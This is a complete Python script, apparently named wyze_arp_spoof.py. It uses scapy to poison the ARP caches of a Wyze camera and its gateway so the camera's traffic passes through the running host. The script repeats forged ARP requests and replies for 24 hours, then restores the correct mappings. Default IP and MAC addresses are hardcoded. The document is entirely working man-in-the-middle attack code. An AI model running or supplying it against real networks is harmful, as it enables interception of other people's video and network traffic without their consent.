"""Poison the camera's view of the gateway (and the gateway's view of the camera) so the camera's
frames reach this host.

  wyze_arp_spoof.py <CAM> <CAMMAC> <GW> <GWMAC> [IF]

The interface is a parameter: it used to be a hardcoded en1, which silently poisoned the wrong NIC
once the host's uplink moved to en0.
"""
from scapy.all import ARP, sendp, get_if_hwaddr
import subprocess, sys, time

CAM = sys.argv[1] if len(sys.argv) > 1 else "192.168.4.51"
CAMMAC = sys.argv[2] if len(sys.argv) > 2 else "80:48:2c:4b:cf:0b"
GW = sys.argv[3] if len(sys.argv) > 3 else "192.168.4.1"
GWMAC = sys.argv[4] if len(sys.argv) > 4 else "48:dd:0c:c9:ec:0d"
IF = sys.argv[5] if len(sys.argv) > 5 else subprocess.run(
    ["route", "-n", "get", CAM], capture_output=True, text=True).stdout.split("interface:")[-1].split()[0]

me = get_if_hwaddr(IF)
end = time.time() + 86400
while time.time() < end:
    sendp(ARP(op=1, psrc=GW, pdst=CAM, hwdst=CAMMAC, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=CAMMAC, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=1, psrc=CAM, pdst=GW, hwdst=GWMAC, hwsrc=me), iface=IF, verbose=0)
    time.sleep(0.7)
for _ in range(4):
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=CAMMAC, hwsrc=GWMAC), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=CAM, pdst=GW, hwdst=GWMAC, hwsrc=CAMMAC), iface=IF, verbose=0)
    time.sleep(0.2)
